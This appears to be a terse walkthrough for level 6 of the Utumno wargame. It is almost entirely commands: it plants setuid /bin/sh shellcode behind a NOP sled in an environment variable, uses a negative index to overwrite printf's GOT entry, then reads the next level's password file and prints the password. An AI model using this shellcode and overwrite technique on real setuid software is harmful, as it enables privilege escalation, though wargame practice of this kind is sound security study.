# Set the environment variables
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 1000 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
# Get EGG's address
/tmp/utumno5_ballban/check_env EGG # 0xffffd9f4

# Get printf's address
gef /utumno/utumno6
disassemble main
disassemble 0x8049040 # DWORD PTR ds:0x804b25c

# argv[1] = index of table
# argv[2] = address of printf(0x804b25c)
# argv[3] = address of EGG(0xffffd9f4)
# ajust the address of EGG 0xffffd9f4 -> 0xffffdaf4
/utumno/utumno6 -1 0x804b25c $(python3 -c "import struct;import sys; sys.stdout.buffer.write(struct.pack('<I', 0xffffdaf4))")

cat /etc/utumno_pass/utumno7
# Password: VHOuCx7iA5